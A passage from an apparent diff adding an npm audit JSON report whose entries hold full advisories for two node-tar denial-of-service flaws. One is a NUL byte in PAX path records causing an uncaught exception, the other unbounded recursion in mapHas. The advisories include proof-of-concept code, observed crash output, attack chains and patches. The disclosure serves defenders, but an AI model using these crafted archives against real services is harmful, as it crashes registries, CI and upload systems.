install tar@7.5.16\n\n# 3. Try to extract with documented try/catch — observe uncaught exception\nmkdir -p ./out\nnode --input-type=module -e '\n  process.on(\"uncaughtException\", e => {\n    console.log(\"UNCAUGHT:\", e.code, \"-\", e.message);\n    process.exit(99);\n  });\n  import(\"tar\").then(async tar => {\n    try {\n      await tar.x({ file: \"../poc.tar\", cwd: \"./out\" });\n      console.log(\"NORMAL_RETURN\");\n    } catch (e) {\n      console.log(\"CAUGHT_BY_USER:\", e.code);\n    }\n  });'\n```\n\n### Observed output (verified 2026-06-23 against `tar@7.5.16`)\n\n```\nUNCAUGHT: ERR_INVALID_ARG_VALUE - The argument 'path' must be a string,\nUint8Array, or URL without null bytes.\nReceived '/.../out/visible.txt\\x00hidden.txt'\nexit: 99\n```\n\nThe exception bypasses the user's `try { await tar.x(...) } catch (e) { ... }` block and lands in the global `uncaughtException` handler. In a typical server without that handler, the process exits.\n\n---\n\n## Impact\n\n### Direct: remote DoS\n\nAny service that ingests attacker-supplied tarballs via node-tar inherits a one-tarball-kills-the-process primitive. Realistic deployments where this is reachable without user interaction:\n\n- npm registry tarball ingestion and downstream mirrors\n- GitHub Actions cache restore (`actions/cache`, `actions/setup-*` extracting toolchains)\n- Container image build pipelines that unpack layer tarballs through node tooling\n- Backup-restore services accepting user uploads\n- CI artifact processors and badge generators\n- Static-site / Docusaurus / Next.js build runners that fetch and extract dep tarballs\n- Cloud functions that auto-extract uploaded archives\n\nA correctly-coded consumer that does:\n\n```js\ntry {\n  await tar.x({ file: req.upload.path, cwd: tmpdir });\n} catch (e) {\n  return res.status(400).json({ error: 'bad archive' });\n}\n```\n\ndoes not catch this throw. The Node process dies and (depending on the supervisor) the worker may take time to respawn or never respawn if it dies during boot.\n\n### Secondary: parser-differential validator bypass (CWE-436)\n\n| Tool                       | Result for `path=visible.txt\\x00hidden.txt` |\n|----------------------------|----------------------------------------------|\n| GNU tar (`tar -tvf`)       | Lists `visible.txt` (truncated at NUL)      |\n| `bsdtar -tvf`              | Lists `visible.txt` (truncated at NUL)      |\n| Python `tarfile.list()`    | Lists `visible.txt\\x00hidden.txt` (raw)     |\n| node-tar `tar.t({file})`   | Emits raw NUL-bearing path (no crash)       |\n| node-tar `tar.x({file})`   | **Crashes** (uncaught throw)                |\n\nA pre-flight validator using GNU tar or bsdtar will see a benign filename; the subsequent node-tar extraction blows up. This is exploitable against any architecture that lists-and-validates-then-extracts.\n\n---\n\n## Suggested patch\n\nMatch the long-name handler in `parse.ts` — strip everything from the first NUL onward in `parseKVLine` value parsing:\n\n```diff\n--- a/src/pax.ts\n+++ b/src/pax.ts\n@@ -173,7 +173,7 @@ const parseKVLine = (set: Record<string, unknown>, line: string) => {\n\n   const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n\n-  const v = kv.join('=')\n+  const v = kv.join('=').replace(/\\0.*$/, '')\n   set[k] =\n     /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n       new Date(Number(v) * 1000)\n```\n\nThis matches `src/parse.ts:379` and `src/parse.ts:386` and closes both `path` and `linkpath` sinks in one change.\n\nA defense-in-depth follow-up: add an explicit `assert(!v.includes('\\0'))` (or fail-soft `return set`) at the top of `parseKVLine` so malformed PAX records that *aren't* path/linkpath also can't smuggle NUL into other unanticipated consumers (e.g. third-party readers of `entry.header.atime` Date objects constructed from `Number(v)` where `v` had embedded NUL).",
+      "reported_by": null,
+      "title": "node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59875"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.16",
+      "github_advisory_id": "GHSA-gvwx-54wh-qm9j",
+      "recommendation": "Upgrade to version 7.5.17 or later",
+      "patched_versions": ">=7.5.17",
+      "updated": "2026-07-20T21:51:12.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-gvwx-54wh-qm9j"
+    },
+    "1145647": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r292-9mhp-454m\n- https://github.com/isaacs/node-tar/commit/631ae59121bf8fc8a22bbae35f074cb9b789cd4a\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.21\n- https://nvd.nist.gov/vuln/detail/CVE-2026-73566\n- https://github.com/advisories/GHSA-r292-9mhp-454m",
+      "created": "2026-07-24T16:26:16.000Z",
+      "id": 1145647,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`node-tar` (npm `tar`) contains an uncontrolled-recursion stack-exhaustion DoS in the internal `mapHas` helper used by `filesFilter`. When a consumer calls `tar.t(...)` or `tar.x(...)` with a non-empty member-selection list, node-tar installs a filter that closes over the recursive `mapHas` (`src/list.ts:33-44`). `mapHas` walks an entry path upward one `path.dirname()` call per recursion **with no segment cap**. A single crafted tar with a GNU-`L` (or PAX-`x`) long-path header can deliver a path of tens of thousands of `/`-separated segments (up to `maxMetaEntrySize` = 1 MiB). The recursion overflows the call stack, throwing an uncatchable `RangeError` that terminates the Node process on async/streaming consumers.\n\n## Root Cause\n`filesFilter` (`src/list.ts:27-51`) is installed whenever a caller passes a member-selection list (`src/list.ts:119-122`, `src/extract.ts:55-57`). Its filter is invoked at `src/parse.ts:253` (`entry.ignore = entry.ignore || !this.filter(entry.path, entry)`) inside `Parser[CONSUMEHEADER]` — and crucially **outside** the only try/catch in that method (which wraps `new Header` at `src/parse.ts:179-183`). `mapHas` recurses once per path segment with no depth limit. The `Unpack` `maxDepth` guard (`src/unpack.ts:342`, in `[CHECKPATH]`) only runs on the `'entry'` event, which fires *after* `CONSUMEHEADER` has already invoked the filter — so the stack overflows before any depth guard executes. `tar.t` (list) has no `maxDepth` at all.\n\n## Impact\nUnauthenticated, remotely-triggerable denial of service: a ~188-byte gzip (≈26 KB tar) crashes any service that lists or extracts *selected members* from an untrusted archive (package registries, CI artifact/cache restore, upload processors). On async (`await tar.t(...)`/`tar.x(...)`) and streaming/`pipe` consumers the `RangeError` escapes the promise as an `uncaughtException` and terminates the process — standard defensive `try/catch` around the async call does NOT prevent it. (The synchronous API is catchable; the async/stream paths — the dominant server pattern — are not.)\n\n## Proof of Concept\n```js\n// Build a tar whose single entry has a GNU-L long path of ~12,000 \"a/\" segments (~26 KB),\n// gzip it (≈188 bytes), then have a consumer list/extract with member selection:\nconst tar = require('tar');\nawait tar.t({ file: 'evil.tar.gz', gzip: true }, ['some-member']); // -> RangeError, process exit\n```\nEmpirically reproduced on Node v24.18.0 against built `dist/commonjs` of node-tar 7.5.20: 188-byte gzip → 26,112-byte tar (12,000 segments) → uncaught `RangeError: Maximum call stack size exceeded` → process exit. A control run with no member-selection list (filter not installed) parses cleanly (exit 0), isolating `mapHas` as the sole cause.\n\n## Attack Chain\n1. **Entry.** Attacker crafts a tar with a GNU `L` (or PAX `x`) long-path header whose body is `\"a/\"`×~12000 (~26 KB), followed by a normal file entry.\n   - **Guard:** `maxMetaEntrySize` caps the meta body at 1 MiB (`src/parse.ts:241`).\n   - **Bypass proof:** 26 KB ≪ 1 MiB → accepted (verified: 26 KB archive parsed up to the filter).\n2. **Trigger.** Victim service calls `tar.t({file},[sel])` or `tar.x({file,cwd},[sel])` (member selection — a documented, common API).\n   - **Guard:** `Unpack.maxDepth` (default 1024) at `src/unpack.ts:342`; decompression-ratio guard.\n   - **Bypass proof:** `maxDepth` lives in `[CHECKPATH]` on the `'entry'` event, which fires *after* `CONSUMEHEADER`'s filter call — the crash occurs before it (extract exits 1 with default maxDepth). `tar.t` has no maxDepth. Ratio is ~139× (trivial); no total-bytes cap applies to the uncompressed meta body.\n3. **Sink.** `this.filter(entry.path)` → `mapHas` recurses once per `/` segment (`src/list.ts:39`).\n   - **Guard:** try/catch in `CONSUMEHEADER`.\n   - **Bypass proof:** the only try/catch wraps `new Header` (`src/parse.ts:179-183`); the `this.filter(...)` call at `src/parse.ts:253` is outside it. The `RangeError` propagates out of the stream write/`'data'` path → uncaught exception (verified: `process.on('uncaughtException')` fires; async `await`+`try/catch` does NOT intercept).\n4. **Impact.** Node process termination; a 188-byte gzip crashes any consumer that lists/extracts selected members from untrusted archives.\n\n## Bypass Evidence\n- `mapHas` recursion is member-name-independent: the crash fires even when the requested members do not match the malicious entry path — the attacker only needs the consumer to *use* member selection.\n- Standalone `mapHas` overflows at 20k–30k segments; on the real streaming path (atop `write → CONSUMECHUNK → CONSUMEHEADER → filter`) it crashes at ≤8k segments (finder's ~12k estimate is accurate for the reachable path).\n- Control (no member list → no filter) parses cleanly (exit 0), isolating `mapHas`.\n\n## Affected Versions\n`<= 7.5.20` (npm `tar`). `mapHas` present verbatim on tag `v7.5.20` (latest GitHub release and npm `dist-tag latest`); no segment/depth cap in `src/list.ts` or the `CONSUMEHEADER` filter path; HEAD == 7.5.20, no unreleased fix.\n\n## Suggested Fix\nRewrite `mapHas` iteratively (walk `dirname` in a `while` loop with a segment/visited cap), or enforce a hard path-segment limit in `Header`/`Parser` independent of `maxMetaEntrySize`, applied before any per-entry filter runs.\n\n## Dedup Note\nDistinct from CVE-2024-28863 / GHSA-f5x3-32g6-qm9j \"lack of folders depth validation\" (that bounds `mkdir` recursion during *extraction* via `maxDepth` in `Unpack[CHECKPATH]` on the `'entry'` event — a different sink, code path, and fix; runs after the filter and does not apply to `tar.t`). Also distinct from the PAX NUL/numeric-path crash advisories (improper-input-to-fs / type confusion, not recursion) and the gzip-bomb advisory (resource exhaustion on disk writes). None touch `list.ts`/`filesFilter`/`mapHas` or require member selection.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+      "reported_by": null,
+      "title": "node-tar: Uncontrolled recursion in mapHas/filesFilter allows uncatchable stack-overflow DoS via crafted long-path tar with member selection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73566"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.20",
+      "github_advisory_id": "GHSA-r292-9mhp-454m",
+      "recommendation": "Upgrade to version 7.5.21 or later",
+      "patched_versions": ">=7.5.21",
+      "updated": "2026-08-21T19:08:23.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-r292-9mhp-454m"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 3,
+      "high": 8,
+      "critical": 1
+    },
+    "dependencies": 9,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 9
+  }
+}
